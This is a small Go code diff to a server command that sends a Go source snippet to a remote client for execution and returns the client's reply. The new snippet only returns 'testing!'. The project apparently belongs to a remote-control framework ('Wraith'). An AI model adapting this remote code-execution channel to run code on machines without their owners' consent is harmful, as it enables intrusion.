@@ -13,12 +13,17 @@ func snippetInfo(ctx lib.CommandContext, arg string) (string, error) {
 	res, err := sendRRToClientAwaitResponse(ctx, target, []byte(`
 package main
 
-import "time"
+import (
+	"wmp/libwraith"
+	"wmp/module"
+)
 
-func Y() {}
+func Y(m *module.ModulePinecomms, w *libwraith.Wraith) []byte {
+	return []byte("testing!")
+}
 `), time.Second*2)
 	if err != nil {
-		return "", fmt.Errorf("failed to execute info snippet for client `%s` due to error: %s", target, err.Error())
+		return "", fmt.Errorf("failed to execute `info` snippet for client `%s` due to error: %s", target, err.Error())
 	}
 
 	return fmt.Sprintf("client response from `%s`: %s", target, string(res.Payload)), nil
